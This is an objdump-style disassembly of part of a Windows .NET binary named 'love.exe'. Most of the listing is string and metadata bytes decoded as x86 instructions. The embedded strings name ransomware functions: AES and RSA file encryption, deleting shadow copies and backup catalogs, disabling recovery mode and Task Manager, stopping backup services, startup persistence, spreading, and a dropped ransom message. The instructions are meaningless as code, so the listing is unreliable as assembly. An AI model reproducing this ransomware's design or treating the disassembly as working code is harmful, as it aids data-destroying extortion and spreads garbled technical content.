  404257:	00 49 02             	add    %cl,0x2(%ecx)
  40425a:	27                   	daa
  40425b:	10 ac 00 e9 00 35 10 	adc    %ch,0x103500e9(%eax,%eax,1)
  404262:	71 00                	jno    0x404264
  404264:	61                   	popa
  404265:	02 a9 04 ac 00 61    	add    0x6100ac04(%ecx),%ch
  40426b:	02 69 10             	add    0x10(%ecx),%ch
  40426e:	71 00                	jno    0x404270
  404270:	c1 00 6e             	roll   $0x6e,(%eax)
  404273:	10 54 00 19          	adc    %dl,0x19(%eax,%eax,1)
  404277:	01 7a 10             	add    %edi,0x10(%edx)
  40427a:	05 03 91 00 92       	add    $0x92009103,%eax
  40427f:	10 54 00 19          	adc    %dl,0x19(%eax,%eax,1)
  404283:	00 a9 04 ac 00 1c    	add    %ch,0x1c00ac04(%ecx)
  404289:	00 a9 04 71 00 1c    	add    %ch,0x1c007104(%ecx)
  40428f:	00 9f 10 c2 03 69    	add    %bl,0x6903c210(%edi)
  404295:	02 a9 04 a7 00 11    	add    0x1100a704(%ecx),%ch
  40429b:	00 a9 04 71 00 71    	add    %ch,0x71007104(%ecx)
  4042a1:	02 b2 10 d2 03 19    	add    0x1903d210(%edx),%dh
  4042a7:	00 bd 10 d6 03 81    	add    %bh,-0x7efc29f0(%ebp)
  4042ad:	02 c9                	add    %cl,%cl
  4042af:	10 19                	adc    %bl,(%ecx)
  4042b1:	03 31                	add    (%ecx),%esi
  4042b3:	00 d5                	add    %dl,%ch
  4042b5:	10 17                	adc    %dl,(%edi)
  4042b7:	01 a1 00 dd 10 80    	add    %esp,-0x7fef2300(%ecx)
  4042bd:	01 19                	add    %ebx,(%ecx)
  4042bf:	00 f9                	add    %bh,%cl
  4042c1:	0f dd 03             	paddusw (%ebx),%mm0
  4042c4:	11 00                	adc    %eax,(%eax)
  4042c6:	07                   	pop    %es
  4042c7:	05 8e 00 11 00       	add    $0x11008e,%eax
  4042cc:	1c 05                	sbb    $0x5,%al
  4042ce:	95                   	xchg   %eax,%ebp
  4042cf:	00 39                	add    %bh,(%ecx)
  4042d1:	00 e8                	add    %ch,%al
  4042d3:	10 17                	adc    %dl,(%edi)
  4042d5:	01 39                	add    %edi,(%ecx)
  4042d7:	00 f4                	add    %dh,%ah
  4042d9:	10 a7 00 89 02 2d    	adc    %ah,0x2d028900(%edi)
  4042df:	05 54 00 a1 00       	add    $0xa10054,%eax
  4042e4:	37                   	aaa
  4042e5:	11 0e                	adc    %ecx,(%esi)
  4042e7:	00 89 00 4c 11 e8    	add    %cl,-0x17eeb400(%ecx)
  4042ed:	03 89 00 5e 11 71    	add    0x71115e00(%ecx),%ecx
  4042f3:	00 89 02 35 05 4a    	add    %cl,0x4a053502(%ecx)
  4042f9:	00 08                	add    %cl,(%eax)
  4042fb:	00 84 00 75 00 2e 00 	add    %al,0x2e0075(%eax,%eax,1)
  404302:	13 00                	adc    (%eax),%eax
  404304:	fd                   	std
  404305:	03 2e                	add    (%esi),%ebp
  404307:	00 1b                	add    %bl,(%ebx)
  404309:	00 06                	add    %al,(%esi)
  40430b:	04 c3                	add    $0xc3,%al
  40430d:	00 2b                	add    %ch,(%ebx)
  40430f:	00 b5 00 e3 00 2b    	add    %dh,0x2b00e300(%ebp)
  404315:	00 b5 00 23 01 2b    	add    %dh,0x2b012300(%ebp)
  40431b:	00 b5 00 43 01 2b    	add    %dh,0x2b014300(%ebp)
  404321:	00 b5 00 63 01 2b    	add    %dh,0x2b016300(%ebp)
  404327:	00 b5 00 83 01 2b    	add    %dh,0x2b018300(%ebp)
  40432d:	00 b5 00 01 04 2b    	add    %dh,0x2b040100(%ebp)
  404333:	00 b5 00 60 04 2b    	add    %dh,0x2b046000(%ebp)
  404339:	00 b5 00 33 00 a5    	add    %dh,-0x5affcd00(%ebp)
  40433f:	00 eb                	add    %ch,%bl
  404341:	00 03                	add    %al,(%ebx)
  404343:	01 1b                	add    %ebx,(%ebx)
  404345:	01 38                	add    %edi,(%eax)
  404347:	01 59 01             	add    %ebx,0x1(%ecx)
  40434a:	73 01                	jae    0x40434d
  40434c:	bc 01 cf 01 f0       	mov    $0xf001cf01,%esp
  404351:	01 f7                	add    %esi,%edi
  404353:	01 0a                	add    %ecx,(%edx)
  404355:	02 15 02 88 02 b8    	add    0xb8028802,%dl
  40435b:	02 be 02 d4 02 e7    	add    -0x18fd2bfe(%esi),%bh
  404361:	02 1d 03 40 03 66    	add    0x66034003,%bl
  404367:	03 76 03             	add    0x3(%esi),%esi
  40436a:	7a 03                	jp     0x40436f
  40436c:	8d 03                	lea    (%ebx),%eax
  40436e:	92                   	xchg   %eax,%edx
  40436f:	03 9d 03 ae 03 c8    	add    -0x37fc51fd(%ebp),%ebx
  404375:	03 e3                	add    %ebx,%esp
  404377:	03 ef                	add    %edi,%ebp
  404379:	03 f6                	add    %esi,%esi
  40437b:	03 05 00 01 00 00    	add    0x100,%eax
  404381:	00 0f                	add    %cl,(%edi)
  404383:	05 9a 00 02 00       	add    $0x2009a,%eax
  404388:	2c 00                	sub    $0x0,%al
  40438a:	03 00                	add    (%eax),%eax
  40438c:	b7 06                	mov    $0x6,%bh
  40438e:	85 01                	test   %eax,(%ecx)
  404390:	db 01                	fildl  (%ecx)
  404392:	bc 03 06 01 03       	mov    $0x3010603,%esp
  404397:	00 a1 02 01 00 40    	add    %ah,0x40000102(%ecx)
  40439d:	01 4b 00             	add    %ecx,0x0(%ebx)
  4043a0:	b3 04                	mov    $0x4,%bl
  4043a2:	01 00                	add    %eax,(%eax)
  4043a4:	40                   	inc    %eax
  4043a5:	01 4d 00             	add    %ecx,0x0(%ebp)
  4043a8:	ce                   	into
  4043a9:	04 01                	add    $0x1,%al
  4043ab:	00 10                	add    %dl,(%eax)
  4043ad:	28 00                	sub    %al,(%eax)
  4043af:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4043b2:	04 80                	add    $0x80,%al
	...
  4043c4:	9f                   	lahf
  4043c5:	06                   	push   %es
  4043c6:	00 00                	add    %al,(%eax)
  4043c8:	04 00                	add    $0x0,%al
	...
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	01 00                	add    %eax,(%eax)
  4043d6:	60                   	pusha
  4043d7:	00 00                	add    %al,(%eax)
  4043d9:	00 00                	add    %al,(%eax)
  4043db:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4043e6:	00 00                	add    %al,(%eax)
  4043e8:	01 00                	add    %eax,(%eax)
  4043ea:	77 00                	ja     0x4043ec
  4043ec:	00 00                	add    %al,(%eax)
  4043ee:	00 00                	add    %al,(%eax)
  4043f0:	04 00                	add    $0x0,%al
	...
  4043fa:	00 00                	add    %al,(%eax)
  4043fc:	01 00                	add    %eax,(%eax)
  4043fe:	69 00 00 00 00 00    	imul   $0x0,(%eax),%eax
  404404:	04 00                	add    $0x0,%al
	...
  40440e:	00 00                	add    %al,(%eax)
  404410:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404411:	03 41 10             	add    0x10(%ecx),%eax
  404414:	00 00                	add    %al,(%eax)
  404416:	00 00                	add    %al,(%eax)
  404418:	03 00                	add    (%eax),%eax
  40441a:	02 00                	add    (%eax),%al
  40441c:	05 00 04 00 06       	add    $0x6000400,%eax
  404421:	00 02                	add    %al,(%edx)
  404423:	00 07                	add    %al,(%edi)
  404425:	00 02                	add    %al,(%edx)
  404427:	00 08                	add    %cl,(%eax)
  404429:	00 07                	add    %al,(%edi)
  40442b:	00 0a                	add    %cl,(%edx)
  40442d:	00 02                	add    %al,(%edx)
  40442f:	00 0b                	add    %cl,(%ebx)
  404431:	00 05 00 0c 00 05    	add    %al,0x5000c00
  404437:	00 63 00             	add    %ah,0x0(%ebx)
  40443a:	9b                   	fwait
  40443b:	01 00                	add    %eax,(%eax)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 00                	add    %al,(%eax)
  404441:	3c 4d                	cmp    $0x4d,%al
  404443:	6f                   	outsl  %ds:(%esi),(%dx)
  404444:	64 75 6c             	fs jne 0x4044b3
  404447:	65 3e 00 6c 6f 76    	gs add %ch,%ds:0x76(%edi,%ebp,2)
  40444d:	65 2e 65 78 65       	gs cs js,pn 0x4044b7
  404452:	00 50 72             	add    %dl,0x72(%eax)
  404455:	6f                   	outsl  %ds:(%esi),(%dx)
  404456:	67 72 61             	addr16 jb 0x4044ba
  404459:	6d                   	insl   (%dx),%es:(%edi)
  40445a:	00 43 6f             	add    %al,0x6f(%ebx)
  40445d:	6e                   	outsb  %ds:(%esi),(%dx)
  40445e:	73 6f                	jae    0x4044cf
  404460:	6c                   	insb   (%dx),%es:(%edi)
  404461:	65 41                	gs inc %ecx
  404463:	70 70                	jo     0x4044d5
  404465:	6c                   	insb   (%dx),%es:(%edi)
  404466:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40446d:	37                   	aaa
  40446e:	00 4e 61             	add    %cl,0x61(%esi)
  404471:	74 69                	je     0x4044dc
  404473:	76 65                	jbe    0x4044da
  404475:	4d                   	dec    %ebp
  404476:	65 74 68             	gs je  0x4044e1
  404479:	6f                   	outsl  %ds:(%esi),(%dx)
  40447a:	64 73 00             	fs jae 0x40447d
  40447d:	64 72 69             	fs jb  0x4044e9
  404480:	76 65                	jbe    0x4044e7
  404482:	4e                   	dec    %esi
  404483:	6f                   	outsl  %ds:(%esi),(%dx)
  404484:	74 69                	je     0x4044ef
  404486:	66 69 63 61 74 69    	imul   $0x6974,0x61(%ebx),%sp
  40448c:	6f                   	outsl  %ds:(%esi),(%dx)
  40448d:	6e                   	outsb  %ds:(%esi),(%dx)
  40448e:	00 4e 6f             	add    %cl,0x6f(%esi)
  404491:	74 69                	je     0x4044fc
  404493:	66 69 63 61 74 69    	imul   $0x6974,0x61(%ebx),%sp
  404499:	6f                   	outsl  %ds:(%esi),(%dx)
  40449a:	6e                   	outsb  %ds:(%esi),(%dx)
  40449b:	46                   	inc    %esi
  40449c:	6f                   	outsl  %ds:(%esi),(%dx)
  40449d:	72 6d                	jb     0x40450c
  40449f:	00 6d 73             	add    %ch,0x73(%ebp)
  4044a2:	63 6f 72             	arpl   %ebp,0x72(%edi)
  4044a5:	6c                   	insb   (%dx),%es:(%edi)
  4044a6:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  4044ad:	65 6d                	gs insl (%dx),%es:(%edi)
  4044af:	00 4f 62             	add    %cl,0x62(%edi)
  4044b2:	6a 65                	push   $0x65
  4044b4:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  4044b8:	79 73                	jns    0x40452d
  4044ba:	74 65                	je     0x404521
  4044bc:	6d                   	insl   (%dx),%es:(%edi)
  4044bd:	2e 57                	cs push %edi
  4044bf:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  4044c6:	46                   	inc    %esi
  4044c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c8:	72 6d                	jb     0x404537
  4044ca:	73 00                	jae    0x4044cc
  4044cc:	46                   	inc    %esi
  4044cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4044ce:	72 6d                	jb     0x40453d
  4044d0:	00 5f 73             	add    %bl,0x73(%edi)
  4044d3:	61                   	popa
  4044d4:	6c                   	insb   (%dx),%es:(%edi)
  4044d5:	74 00                	je     0x4044d7
  4044d7:	75 73                	jne    0x40454c
  4044d9:	65 72 4e             	gs jb  0x40452a
  4044dc:	61                   	popa
  4044dd:	6d                   	insl   (%dx),%es:(%edi)
  4044de:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
  4044e2:	65 72 44             	gs jb  0x404529
  4044e5:	69 72 00 61 70 70 4d 	imul   $0x4d707061,0x0(%edx),%esi
  4044ec:	75 74                	jne    0x404562
  4044ee:	65 78 52             	gs js  0x404543
  4044f1:	75 6e                	jne    0x404561
  4044f3:	00 65 6e             	add    %ah,0x6e(%ebp)
  4044f6:	63 72 79             	arpl   %esi,0x79(%edx)
  4044f9:	70 74                	jo     0x40456f
  4044fb:	69 6f 6e 41 65 73 52 	imul   $0x52736541,0x6e(%edi),%ebp
  404502:	73 61                	jae    0x404565
  404504:	00 65 6e             	add    %ah,0x6e(%ebp)
  404507:	63 72 79             	arpl   %esi,0x79(%edx)
  40450a:	70 74                	jo     0x404580
  40450c:	65 64 46             	gs fs inc %esi
  40450f:	69 6c 65 45 78 74 65 	imul   $0x6e657478,0x45(%ebp,%eiz,2),%ebp
  404516:	6e 
  404517:	73 69                	jae    0x404582
  404519:	6f                   	outsl  %ds:(%esi),(%dx)
  40451a:	6e                   	outsb  %ds:(%esi),(%dx)
  40451b:	00 63 68             	add    %ah,0x68(%ebx)
  40451e:	65 63 6b 53          	arpl   %ebp,%gs:0x53(%ebx)
  404522:	70 72                	jo     0x404596
  404524:	65 61                	gs popa
  404526:	64 00 73 70          	add    %dh,%fs:0x70(%ebx)
  40452a:	72 65                	jb     0x404591
  40452c:	61                   	popa
  40452d:	64 4e                	fs dec %esi
  40452f:	61                   	popa
  404530:	6d                   	insl   (%dx),%es:(%edi)
  404531:	65 00 63 68          	add    %ah,%gs:0x68(%ebx)
  404535:	65 63 6b 43          	arpl   %ebp,%gs:0x43(%ebx)
  404539:	6f                   	outsl  %ds:(%esi),(%dx)
  40453a:	70 79                	jo     0x4045b5
  40453c:	52                   	push   %edx
  40453d:	6f                   	outsl  %ds:(%esi),(%dx)
  40453e:	61                   	popa
  40453f:	6d                   	insl   (%dx),%es:(%edi)
  404540:	69 6e 67 00 70 72 6f 	imul   $0x6f727000,0x67(%esi),%ebp
  404547:	63 65 73             	arpl   %esp,0x73(%ebp)
  40454a:	73 4e                	jae    0x40459a
  40454c:	61                   	popa
  40454d:	6d                   	insl   (%dx),%es:(%edi)
  40454e:	65 00 61 70          	add    %ah,%gs:0x70(%ecx)
  404552:	70 4d                	jo     0x4045a1
  404554:	75 74                	jne    0x4045ca
  404556:	65 78 52             	gs js  0x4045ab
  404559:	75 6e                	jne    0x4045c9
  40455b:	32 00                	xor    (%eax),%al
  40455d:	63 68 65             	arpl   %ebp,0x65(%eax)
  404560:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  404563:	74 61                	je     0x4045c6
  404565:	72 74                	jb     0x4045db
  404567:	75 70                	jne    0x4045d9
  404569:	46                   	inc    %esi
  40456a:	6f                   	outsl  %ds:(%esi),(%dx)
  40456b:	6c                   	insb   (%dx),%es:(%edi)
  40456c:	64 65 72 00          	fs gs jb 0x404570
  404570:	63 68 65             	arpl   %ebp,0x65(%eax)
  404573:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  404576:	6c                   	insb   (%dx),%es:(%edi)
  404577:	65 65 70 00          	gs gs jo 0x40457b
  40457b:	73 6c                	jae    0x4045e9
  40457d:	65 65 70 54          	gs gs jo 0x4045d5
  404581:	65 78 74             	gs js  0x4045f8
  404584:	62 6f 78             	bound  %ebp,0x78(%edi)
  404587:	00 62 61             	add    %ah,0x61(%edx)
  40458a:	73 65                	jae    0x4045f1
  40458c:	36 34 49             	ss xor $0x49,%al
  40458f:	6d                   	insl   (%dx),%es:(%edi)
  404590:	61                   	popa
  404591:	67 65 00 61 70       	add    %ah,%gs:0x70(%bx,%di)
  404596:	70 4d                	jo     0x4045e5
  404598:	75 74                	jne    0x40460e
  40459a:	65 78 53             	gs js  0x4045f0
  40459d:	74 61                	je     0x404600
  40459f:	72 74                	jb     0x404615
  4045a1:	75 70                	jne    0x404613
  4045a3:	00 64 72 6f          	add    %ah,0x6f(%edx,%esi,2)
  4045a7:	70 70                	jo     0x404619
  4045a9:	65 64 4d             	gs fs dec %ebp
  4045ac:	65 73 73             	gs jae 0x404622
  4045af:	61                   	popa
  4045b0:	67 65 54             	addr16 gs push %esp
  4045b3:	65 78 74             	gs js  0x40462a
  4045b6:	62 6f 78             	bound  %ebp,0x78(%edi)
  4045b9:	00 63 68             	add    %ah,0x68(%ebx)
  4045bc:	65 63 6b 41          	arpl   %ebp,%gs:0x41(%ebx)
  4045c0:	64 6d                	fs insl (%dx),%es:(%edi)
  4045c2:	69 6e 50 72 69 76 69 	imul   $0x69766972,0x50(%esi),%ebp
  4045c9:	6c                   	insb   (%dx),%es:(%edi)
  4045ca:	61                   	popa
  4045cb:	67 65 00 63 68       	add    %ah,%gs:0x68(%bp,%di)
  4045d0:	65 63 6b 64          	arpl   %ebp,%gs:0x64(%ebx)
  4045d4:	65 6c                	gs insb (%dx),%es:(%edi)
  4045d6:	65 74 65             	gs je  0x40463e
  4045d9:	53                   	push   %ebx
  4045da:	68 61 64 6f 77       	push   $0x776f6461
  4045df:	43                   	inc    %ebx
  4045e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045e1:	70 69                	jo     0x40464c
  4045e3:	65 73 00             	gs jae 0x4045e6
  4045e6:	63 68 65             	arpl   %ebp,0x65(%eax)
  4045e9:	63 6b 64             	arpl   %ebp,0x64(%ebx)
  4045ec:	69 73 61 62 6c 65 52 	imul   $0x52656c62,0x61(%ebx),%esi
  4045f3:	65 63 6f 76          	arpl   %ebp,%gs:0x76(%edi)
  4045f7:	65 72 79             	gs jb  0x404673
  4045fa:	4d                   	dec    %ebp
  4045fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4045fc:	64 65 00 63 68       	fs add %ah,%gs:0x68(%ebx)
  404601:	65 63 6b 64          	arpl   %ebp,%gs:0x64(%ebx)
  404605:	65 6c                	gs insb (%dx),%es:(%edi)
  404607:	65 74 65             	gs je  0x40466f
  40460a:	42                   	inc    %edx
  40460b:	61                   	popa
  40460c:	63 6b 75             	arpl   %ebp,0x75(%ebx)
  40460f:	70 43                	jo     0x404654
  404611:	61                   	popa
  404612:	74 61                	je     0x404675
  404614:	6c                   	insb   (%dx),%es:(%edi)
  404615:	6f                   	outsl  %ds:(%esi),(%dx)
  404616:	67 00 64 69          	add    %ah,0x69(%si)
  40461a:	73 61                	jae    0x40467d
  40461c:	62 6c 65 54          	bound  %ebp,0x54(%ebp,%eiz,2)
  404620:	61                   	popa
  404621:	73 6b                	jae    0x40468e
  404623:	4d                   	dec    %ebp
  404624:	61                   	popa
  404625:	6e                   	outsb  %ds:(%esi),(%dx)
  404626:	61                   	popa
  404627:	67 65 72 00          	addr16 gs jb 0x40462b
  40462b:	63 68 65             	arpl   %ebp,0x65(%eax)
  40462e:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  404631:	74 6f                	je     0x4046a2
  404633:	70 42                	jo     0x404677
  404635:	61                   	popa
  404636:	63 6b 75             	arpl   %ebp,0x75(%ebx)
  404639:	70 53                	jo     0x40468e
  40463b:	65 72 76             	gs jb  0x4046b4
  40463e:	69 63 65 73 00 61 70 	imul   $0x70610073,0x65(%ebx),%esp
  404645:	70 4d                	jo     0x404694
  404647:	75 74                	jne    0x4046bd
  404649:	65 78 53             	gs js  0x40469f
  40464c:	74 61                	je     0x4046af
  40464e:	72 74                	jb     0x4046c4
  404650:	75 70                	jne    0x4046c2
  404652:	32 00                	xor    (%eax),%al
  404654:	61                   	popa
  404655:	70 70                	jo     0x4046c7
  404657:	4d                   	dec    %ebp
  404658:	75 74                	jne    0x4046ce
  40465a:	65 78 32             	gs js  0x40468f
  40465d:	00 73 74             	add    %dh,0x74(%ebx)
  404660:	61                   	popa
  404661:	74 69                	je     0x4046cc
  404663:	63 53 70             	arpl   %edx,0x70(%ebx)
  404666:	6c                   	insb   (%dx),%es:(%edi)
  404667:	69 74 00 61 70 70 4d 	imul   $0x754d7070,0x61(%eax,%eax,1),%esi
  40466e:	75 
  40466f:	74 65                	je     0x4046d6
  404671:	78 00                	js     0x404673
  404673:	53                   	push   %ebx
  404674:	79 73                	jns    0x4046e9
  404676:	74 65                	je     0x4046dd
  404678:	6d                   	insl   (%dx),%es:(%edi)
  404679:	2e 54                	cs push %esp
  40467b:	65 78 74             	gs js  0x4046f2
  40467e:	2e 52                	cs push %edx
  404680:	65 67 75 6c          	gs addr16 jne 0x4046f0
  404684:	61                   	popa
  404685:	72 45                	jb     0x4046cc
  404687:	78 70                	js     0x4046f9
  404689:	72 65                	jb     0x4046f0
  40468b:	73 73                	jae    0x404700
  40468d:	69 6f 6e 73 00 52 65 	imul   $0x65520073,0x6e(%edi),%ebp
  404694:	67 65 78 00          	addr16 gs js 0x404698
  404698:	61                   	popa
  404699:	70 70                	jo     0x40470b
  40469b:	4d                   	dec    %ebp
  40469c:	75 74                	jne    0x404712
  40469e:	65 78 52             	gs js  0x4046f3
  4046a1:	65 67 65 78 00       	gs addr16 gs js 0x4046a6
  4046a6:	53                   	push   %ebx
  4046a7:	79 73                	jns    0x40471c
  4046a9:	74 65                	je     0x404710
  4046ab:	6d                   	insl   (%dx),%es:(%edi)
  4046ac:	2e 43                	cs inc %ebx
  4046ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4046af:	6c                   	insb   (%dx),%es:(%edi)
  4046b0:	6c                   	insb   (%dx),%es:(%edi)
  4046b1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4046b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4046b7:	73 2e                	jae    0x4046e7
  4046b9:	47                   	inc    %edi
  4046ba:	65 6e                	outsb  %gs:(%esi),(%dx)
  4046bc:	65 72 69             	gs jb  0x404728
  4046bf:	63 00                	arpl   %eax,(%eax)
  4046c1:	4c                   	dec    %esp
  4046c2:	69 73 74 60 31 00 6d 	imul   $0x6d003160,0x74(%ebx),%esi
  4046c9:	65 73 73             	gs jae 0x40473f
  4046cc:	61                   	popa
  4046cd:	67 65 73 00          	addr16 gs jae 0x4046d1
  4046d1:	76 61                	jbe    0x404734
  4046d3:	6c                   	insb   (%dx),%es:(%edi)
  4046d4:	69 64 45 78 74 65 6e 	imul   $0x736e6574,0x78(%ebp,%eax,2),%esp
  4046db:	73 
  4046dc:	69 6f 6e 73 00 53 79 	imul   $0x79530073,0x6e(%edi),%ebp
  4046e3:	73 74                	jae    0x404759
  4046e5:	65 6d                	gs insl (%dx),%es:(%edi)
  4046e7:	50                   	push   %eax
  4046e8:	61                   	popa
  4046e9:	72 61                	jb     0x40474c
  4046eb:	6d                   	insl   (%dx),%es:(%edi)
  4046ec:	65 74 65             	gs je  0x404754
  4046ef:	72 73                	jb     0x404764
  4046f1:	49                   	dec    %ecx
  4046f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4046f3:	66 6f                	outsw  %ds:(%esi),(%dx)
  4046f5:	00 4d 61             	add    %cl,0x61(%ebp)
  4046f8:	69 6e 00 52 75 6e 00 	imul   $0x6e7552,0x0(%esi),%ebp
  4046ff:	66 6f                	outsw  %ds:(%esi),(%dx)
  404701:	72 62                	jb     0x404765
  404703:	69 64 64 65 6e 43 6f 	imul   $0x756f436e,0x65(%esp,%eiz,2),%esp
  40470a:	75 
  40470b:	6e                   	outsb  %ds:(%esi),(%dx)
  40470c:	74 72                	je     0x404780
  40470e:	79 00                	jns    0x404710
  404710:	73 6c                	jae    0x40477e
  404712:	65 65 70 4f          	gs gs jo 0x404765
  404716:	75 74                	jne    0x40478c
  404718:	4f                   	dec    %edi
  404719:	66 54                	push   %sp
  40471b:	65 6d                	gs insl (%dx),%es:(%edi)
  40471d:	70 46                	jo     0x404765
  40471f:	6f                   	outsl  %ds:(%esi),(%dx)
  404720:	6c                   	insb   (%dx),%es:(%edi)
  404721:	64 65 72 00          	fs gs jb 0x404725
  404725:	52                   	push   %edx
  404726:	65 67 69 73 74 72 79 	imul   $0x61567972,%gs:0x74(%bp,%di),%esi
  40472d:	56 61 
  40472f:	6c                   	insb   (%dx),%es:(%edi)
  404730:	75 65                	jne    0x404797
  404732:	00 41 6c             	add    %al,0x6c(%ecx)
  404735:	72 65                	jb     0x40479c
  404737:	61                   	popa
  404738:	64 79 52             	fs jns 0x40478d
  40473b:	75 6e                	jne    0x4047ab
  40473d:	6e                   	outsb  %ds:(%esi),(%dx)
  40473e:	69 6e 67 00 52 61 6e 	imul   $0x6e615200,0x67(%esi),%ebp
  404745:	64 6f                	outsl  %fs:(%esi),(%dx)
  404747:	6d                   	insl   (%dx),%es:(%edi)
  404748:	00 72 61             	add    %dh,0x61(%edx)
  40474b:	6e                   	outsb  %ds:(%esi),(%dx)
  40474c:	64 6f                	outsl  %fs:(%esi),(%dx)
  40474e:	6d                   	insl   (%dx),%es:(%edi)
  40474f:	00 52 61             	add    %dl,0x61(%edx)
  404752:	6e                   	outsb  %ds:(%esi),(%dx)
  404753:	64 6f                	outsl  %fs:(%esi),(%dx)
  404755:	6d                   	insl   (%dx),%es:(%edi)
  404756:	53                   	push   %ebx
  404757:	74 72                	je     0x4047cb
  404759:	69 6e 67 00 52 61 6e 	imul   $0x6e615200,0x67(%esi),%ebp
  404760:	64 6f                	outsl  %fs:(%esi),(%dx)
  404762:	6d                   	insl   (%dx),%es:(%edi)
  404763:	53                   	push   %ebx
  404764:	74 72                	je     0x4047d8
  404766:	69 6e 67 46 6f 72 45 	imul   $0x45726f46,0x67(%esi),%ebp
  40476d:	78 74                	js     0x4047e3
  40476f:	65 6e                	outsb  %gs:(%esi),(%dx)
  404771:	73 69                	jae    0x4047dc
  404773:	6f                   	outsl  %ds:(%esi),(%dx)
  404774:	6e                   	outsb  %ds:(%esi),(%dx)
  404775:	00 42 61             	add    %al,0x61(%edx)
  404778:	73 65                	jae    0x4047df
  40477a:	36 34 45             	ss xor $0x45,%al
  40477d:	6e                   	outsb  %ds:(%esi),(%dx)
  40477e:	63 6f 64             	arpl   %ebp,0x64(%edi)
  404781:	65 53                	gs push %ebx
  404783:	74 72                	je     0x4047f7
  404785:	69 6e 67 00 65 6e 63 	imul   $0x636e6500,0x67(%esi),%ebp
  40478c:	72 79                	jb     0x404807
  40478e:	70 74                	jo     0x404804
  404790:	44                   	inc    %esp
  404791:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  404798:	79 00                	jns    0x40479a
  40479a:	63 68 65             	arpl   %ebp,0x65(%eax)
  40479d:	63 6b 44             	arpl   %ebp,0x44(%ebx)
  4047a0:	69 72 43 6f 6e 74 61 	imul   $0x61746e6f,0x43(%edx),%esi
  4047a7:	69 6e 73 00 72 73 61 	imul   $0x61737200,0x73(%esi),%ebp
  4047ae:	4b                   	dec    %ebx
  4047af:	65 79 00             	gs jns 0x4047b2
  4047b2:	43                   	inc    %ebx
  4047b3:	72 65                	jb     0x40481a
  4047b5:	61                   	popa
  4047b6:	74 65                	je     0x40481d
  4047b8:	50                   	push   %eax
  4047b9:	61                   	popa
  4047ba:	73 73                	jae    0x40482f
  4047bc:	77 6f                	ja     0x40482d
  4047be:	72 64                	jb     0x404824
  4047c0:	00 41 45             	add    %al,0x45(%ecx)
  4047c3:	53                   	push   %ebx
  4047c4:	5f                   	pop    %edi
  4047c5:	45                   	inc    %ebp
  4047c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4047c7:	63 72 79             	arpl   %esi,0x79(%edx)
  4047ca:	70 74                	jo     0x404840
  4047cc:	00 41 45             	add    %al,0x45(%ecx)
  4047cf:	53                   	push   %ebx
  4047d0:	5f                   	pop    %edi
  4047d1:	45                   	inc    %ebp
  4047d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4047d3:	63 72 79             	arpl   %esi,0x79(%edx)
  4047d6:	70 74                	jo     0x40484c
  4047d8:	5f                   	pop    %edi
  4047d9:	4c                   	dec    %esp
  4047da:	61                   	popa
  4047db:	72 67                	jb     0x404844
  4047dd:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4047e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4047e2:	65 72 61             	gs jb  0x404846
  4047e5:	74 65                	je     0x40484c
  4047e7:	52                   	push   %edx
  4047e8:	61                   	popa
  4047e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4047ea:	64 6f                	outsl  %fs:(%esi),(%dx)
  4047ec:	6d                   	insl   (%dx),%es:(%edi)
  4047ed:	53                   	push   %ebx
  4047ee:	61                   	popa
  4047ef:	6c                   	insb   (%dx),%es:(%edi)
  4047f0:	74 00                	je     0x4047f2
  4047f2:	52                   	push   %edx
  4047f3:	53                   	push   %ebx
  4047f4:	41                   	inc    %ecx
  4047f5:	5f                   	pop    %edi
  4047f6:	45                   	inc    %ebp
  4047f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4047f8:	63 72 79             	arpl   %esi,0x79(%edx)
  4047fb:	70 74                	jo     0x404871
  4047fd:	00 6c 6f 6f          	add    %ch,0x6f(%edi,%ebp,2)
  404801:	6b 46 6f 72          	imul   $0x72,0x6f(%esi),%eax
  404805:	44                   	inc    %esp
  404806:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40480d:	69 65 73 00 63 6f 70 	imul   $0x706f6300,0x73(%ebp),%esp
  404814:	79 52                	jns    0x404868
  404816:	6f                   	outsl  %ds:(%esi),(%dx)
  404817:	61                   	popa
  404818:	6d                   	insl   (%dx),%es:(%edi)
  404819:	69 6e 67 00 63 6f 70 	imul   $0x706f6300,0x67(%esi),%ebp
  404820:	79 52                	jns    0x404874
  404822:	65 73 69             	gs jae 0x40488e
  404825:	73 74                	jae    0x40489b
  404827:	46                   	inc    %esi
  404828:	6f                   	outsl  %ds:(%esi),(%dx)
  404829:	72 41                	jb     0x40486c
  40482b:	64 6d                	fs insl (%dx),%es:(%edi)
  40482d:	69 6e 00 61 64 64 4c 	imul   $0x4c646461,0x0(%esi),%ebp
  404834:	69 6e 6b 54 6f 53 74 	imul   $0x74536f54,0x6b(%esi),%ebp
  40483b:	61                   	popa
  40483c:	72 74                	jb     0x4048b2
  40483e:	75 70                	jne    0x4048b0
  404840:	00 61 64             	add    %ah,0x64(%ecx)
  404843:	64 41                	fs inc %ecx
